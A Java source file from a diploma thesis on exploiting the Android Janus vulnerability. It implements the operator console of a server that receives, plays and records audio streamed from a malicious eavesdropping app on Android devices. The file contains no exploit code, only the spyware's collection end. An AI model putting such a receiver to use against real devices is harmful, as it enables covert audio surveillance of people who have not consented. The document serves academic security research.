// Tento kod je soucast diplomove prace Vyuziti zranitelnosti Janus na operacnim systemu Android
// Autor: Bc. Vit Soucek
//
// Pouzite zdroje:
//    - zminene primo v kodu v dokumentacnich komentarich

package com.company;

import java.io.IOException;
import java.util.Scanner;

class Server {
    private static ServerThread thread;
    private static int maxMemorySize = 100;
    private static int threadCount = 8;

    /**
     * Vstupni bod programu.
     * <p>
     * Inicializuje hlavni vlakno serveru, ukaze napovedu
     * a pote nacita a interpretuje vstup uzivatele.
     *
     * @param args Dva argumenty -- maximalni povolena pamet pro prednahravani jednotlivzych spojeni
     *             a pocet vlaken, ktere budou zpracovavat prijata data.
     */
    public static void main(String[] args) {

        parseArguments(args);
        System.out.println("[-] Max memory to use per connection: " + maxMemorySize + " MB");
        System.out.println("[-] Number of threads: " + threadCount);

        thread = new ServerThread(maxMemorySize, threadCount);
        thread.start();

        showWelcomeScreen();

        Scanner input = new Scanner(System.in);

        boolean status = true;

        while (status) {
            String connectionID;
            System.out.print("> ");
            String option = input.next();
            switch (option) {
                case "l":
                    listConnections();
                    break;
                case "s":
                    connectionID = input.next();
                    switchToConnection(connectionID);
                    break;
                case "d":
                    connectionID = input.next();
                    removeConnection(connectionID);
                    break;
                case "q":
                    status = false;
                    thread.status = false;
                    break;
                case "r":
                    connectionID = input.next();
                    startRecording(connectionID);
                    break;
                case "c":
                    connectionID = input.next();
                    stopRecording(connectionID);
                    break;
                case "h":
                    showHelp();
                    break;
                default:
                    System.out.println("Unknown command: " + option);
            }
        }
        System.out.println("Exiting the application");
        System.exit(0);
    }

    /**
     * Nacteni argumentu z prikazove radky
     * @param args Pole retezcu s argumenty
     */
    private static void parseArguments(String[] args) {
        if (args.length == 0) {
            System.out.println("[-] Using default parameter values");
        } else if (args.length == 4) {
            for (int i = 0; i < args.length; i += 2) {
                switch (args[i]) {
                    case "-t":
                        int tc = Integer.parseInt(args[i + 1]);
                        if (tc < 1) {
                            System.out.println("Argument THREAD_CNT must be >= 1!");
                            showUsage();
                            System.exit(0);
                        }
                        threadCount = tc;
                        break;
                    case "-m":
                        int mm = Integer.parseInt(args[i + 1]);
                        if (mm < 1) {
                            System.out.println("Argument MAX_MEM must be >= 1");
                            showUsage();
                            System.exit(0);
                        }
                        maxMemorySize = mm;
                        break;
                    case "-h":
                        showUsage();
                        System.exit(0);
                        break;
                    default:
                        System.out.println("Unknown argument");
                        showUsage();
                        System.exit(0);
                }
            }
        } else {
            System.out.println("Wrong number of arguments!");
            showUsage();
            System.exit(0);
        }
    }

    /**
     * Ukaze text s navodem ke spusteni aplikace.
     */
    private static void showUsage() {
        System.out.println("Usage:");
        System.out.println("- default parameters: $ java com.company.Server");
        System.out.println("- custom parameters:  $ java com.company.Server -t <THREAD_CNT> -m <MAX_MEM>");
        System.out.println("  THREAD_CNT -- number of threads the application will run with (default: " + threadCount + ")");
        System.out.println("  MAX_MEM -- max memory (in MB) allocated for pre-recording one connection (default: " + maxMemorySize + ")");
    }

    /**
     * Yastavi nahravani spojeni predaneho v parametru
     * <p>
     * Pokud connectionID je "a" nebo "active", nahradi
     * ho ID aktivniho spojeni.
     *
     * @param connectionID ID spojeni, ktere ma byt zastaveno.
     */
    private static void stopRecording(String connectionID) {
        if (connectionID.equals("a") || connectionID.equals("active")) {
            connectionID = thread.activeConnection.get();
            if (connectionID.equals("")) {
                System.out.println("[-] No active connection, cannot stop recording it");
                return;
            }
        }

        if (!verifyConnectionFormat(connectionID))
            return;

        Connection toStop = thread.connections.get(connectionID);
        if (toStop != null)
            toStop.stopRecording();
        else
            System.out.println("[-] Connection with this ID not found");
    }

    /**
     * Zacne nahravat spojeni predane v parametru
     * Pokud connectionID je "a" nebo "active", nahradi
     * ho ID aktivniho spojeni.
     *
     * @param connectionID ID spojeni, ktere ma byt nahravano
     */
    private static void startRecording(String connectionID) {
        if (connectionID.equals("a") || connectionID.equals("active")) {
            connectionID = thread.activeConnection.get();
            if (connectionID.equals("")) {
                System.out.println("[-] No active connection to record");
                return;
            }
        }

        if (!verifyConnectionFormat(connectionID))
            return;

        Connection toRecord = thread.connections.get(connectionID);
        if (toRecord != null)
            toRecord.startRecording();
        else
            System.out.println("[-] Connection with this ID not found");
    }

    /**
     * Odebere spojeni predane v parametru ze seznamu vsech spojeni.
     *
     * @param connectionID Spojeni, ktere ma byt odebrano
     */
    private static void removeConnection(String connectionID) {
        if (connectionID.equals("a") || connectionID.equals("active"))
            connectionID = thread.activeConnection.get();

        if (verifyConnectionFormat(connectionID)) {
            thread.removeConnection(connectionID);
        }
    }

    /**
     * Kontroluje, jestli ID spojeni z parametru ma spravny format
     * <p>
     * Korektni ID spojeni vzdy ma nasledujici tvar:
     * IP:port
     * <p>
     * Krome formatu je kontrolovana platnost IP adresy (0-255) a portu (0-65535)
     * <p>
     * Inspirovano odpovedi na otazku "Validate IPv4 address in Java" na StackOverflow.
     * autor odpovedi: Akarshit Wal
     * dostupne z: https://stackoverflow.com/a/30691451/6136143
     *
     * @param connectionID ID spojeni, ktere ma byt overeno
     * @return True pokud je ID platne, jinak false
     */
    private static boolean verifyConnectionFormat(String connectionID) {
        String[] split_conn = connectionID.split(":");

        if (split_conn.length != 2) {
            System.out.println("Connection in wrong format: " + connectionID + ". Should be: IP:port");
            return false;
        }

        String ip = split_conn[0];
        int port = Integer.parseInt(split_conn[1]);

        String pattern = "^((0|1\\d?\\d?|2[0-4]?\\d?|25[0-5]?|[3-9]\\d?)\\.){3}(0|1\\d?\\d?|2[0-4]?\\d?|25[0-5]?|[3-9]\\d?)$";
        if (!ip.matches(pattern)) {
            System.out.println("IP address is not valid: " + ip);
            return false;
        }

        if (port > 65535 || port < 0) {
            System.out.println("Invalid port number: " + port);
            return false;
        }
        return true;
    }

    /**
     * Spojeni predane v parametru nastavi jako aktivni
     * <p>
     * ID spojeni je nejprve overeno.
     *
     * @param connectionID ID spojeni, ktere ma byt aktivni
     */
    private static void switchToConnection(String connectionID) {
        if (verifyConnectionFormat(connectionID)) {
            if (!thread.connections.containsKey(connectionID)) {
                System.out.println("[-] The connection does not exist");
                return;
            }
            System.out.println("[-] Connection " + connectionID + " set as active. Replaced " + thread.activeConnection);
            thread.activeConnection.set(connectionID);
        }
    }

    /**
     * Vypise seznam vsech aktualnich spojeni.
     */
    private static void listConnections() {
        System.out.println("----------------------------------------");
        System.out.println("Active connection: " + thread.activeConnection);
        System.out.println("----------------------------------------");
        System.out.println("Other connections: ");
        for (String connectionID : thread.connections.keySet()) {
            if (!connectionID.equals(thread.activeConnection.get()))
                System.out.println(" - " + connectionID);
        }
    }

    /**
     * Vypise navod k pouziti.
     */
    private static void showHelp() {
        System.out.println();
        System.out.println("USAGE:");
        System.out.println("======");
        System.out.println("l: List all available connections");
        System.out.println("   This option lists all connection that are known to the server.");
        System.out.println("   The server automatically saves a connection to the list when it");
        System.out.println("     receives some data from the connection.");
        System.out.println();
        System.out.println("s <CONNECTION>: Switch to chosen connection");
        System.out.println("                Make this connection active -- data from this connection");
        System.out.println("                  will be played on the speaker.");
        System.out.println("                Example: s 192.168.1.100:12345");
        System.out.println();
        System.out.println("d <CONNECTION>: Delete selected connection");
        System.out.println("                Once you receive no data from a connection, you can manually");
        System.out.println("                  remove it from the list.");
        System.out.println("                Example: r 192.168.1.100:12345");
        System.out.println();
        System.out.println("r <CONNECTION>: Start recording the connection");
        System.out.println("   The recording will be saved in current directory as <connection>___<timestamp>.wav");
        System.out.println();
        System.out.println("c <CONNECTION>: Stop recording the active connection");
        System.out.println();
        System.out.println("q: Quit this application.");
        System.out.println();
        System.out.println("h: Show this help");
        System.out.println();
        System.out.println("<CONNECTION> can be either a string in format IP:port or a letter 'a' for a connection that is active at the time (except for the 's' command)");
    }

    /**
     * Vypise uvitaci obrazovku.
     */
    private static void showWelcomeScreen(){
        System.out.println("   ___                         _____                          \n" +
                "  |_  |                       /  ___|                         \n" +
                "    | | __ _ _ __  _   _ ___  \\ `--   ___ _ ____   _____ _ __ \n" +
                "    | |/ _` | '_ \\| | | / __|  `--  \\/ _ \\ '__\\ \\ / / _ \\ '__|\n" +
                "/\\__/ / (_| | | | | |_| \\__ \\ /\\__/ /  __/ |   \\ V /  __/ |   \n" +
                "\\____/ \\__,_|_| |_|\\__,_|___/ \\____/ \\___|_|    \\_/ \\___|_|  \n" +
                "\n" +
                "             MMMMMMMMMMMMMM      Server program created to receive\n" +
                "          IMMMMMMMMMMMMMMMMMM     data from the mallicious eavesdropping\n" +
                "         MMMMMMMMMMMMMMMMMMMMM     application installed on an Android device.\n" +
                "        MMMMMMMMMMMMMMMMMMMMMMM         \n" +
                "       ,MMMMMMMMMMMMMMMMMMMMMMMM   This program is a part of the diploma thesis\n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM        \n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM   -------------------------------\n" +
                "       MMMMMMMMMMMMMMMMMMMMMMMMM   \"Exploiting Janus vulnerability\n" +
                "        MMM~     DMMMMMM  +MMMMM          on Android OS\"   \n" +
                "        MMM       IMM       MMM    -------------------------------\n" +
                "         MMM      M=NM      DM,    Author: inserthackernamehere, 2020\n" +
                "          MMMMM MMM  MMM   MMM          \n" +
                "          MMMMMMMM    MMMMMMMM   If you want to change the limits on used memory\n" +
                "          MMMMMMMM, M,MMMMMMMM   and threads used, relaunch the program\n" +
                "             ,MMMMMMMMMMMMMMM    with arguments:\n" +
                "            ? MMMMMMMMMMM               \n" +
                "             +   MMMMM +         $ java <program> -t <THR_CNT> -m <MAX_MEM>\n" +
                "             MD         MM              _______\n" +
                "             MMMMM,M MMMMM              |USAGE:|________________________________\n" +
                "              MMMMMMMMMMMM              | h        - show help\n" +
                "                MMMMMMMN        7MMM    | l        - list available connections\n" +
                "  MMMMMMMMM        :       MMMMMMMMMMM  | s <CONN> - listen to connection <CONN>\n" +
                " MMMMMMMMMMMMMMM      OMMMMMMMMMMM    M | d <CONN> - delete <CONN> from the list\n" +
                "MMMMM  MMMMMMMMMMM=MMMMMMMMMMMMM MMMMMM |            of connections\n" +
                "MMMMMMM MM     $MMMMMMM8     MM MMMMMM  | r <CONN> - Start recording <CONN>\n" +
                "  MMMMMM M   MMMMMMMDMMMMMM   MMMMMMM   | c <CONN> - Stop recording <CONN>,\n" +
                "    MMMMN MMMMMMM     MMMMMMMI          |            save to file\n" +
                "        MMMMMMM         ,MMMMMMM        | q        - quit application\n" +
                "      MMMMMMMMM         MMMMMMMMM8      | \n" +
                "      MMMM  MMMM         MMM  MMMM      | <CONN> can either be a connection\n" +
                "      MM NMMMMMM        MMMMMMIZMM      | identifier in format IP:port or\n" +
                "      MMMMMMMMM          MMMMMM~M       | a letter 'a' for connection that\n" +
                "       MMMMMM              MMMMM        | is active at the time.\n");
    }
}

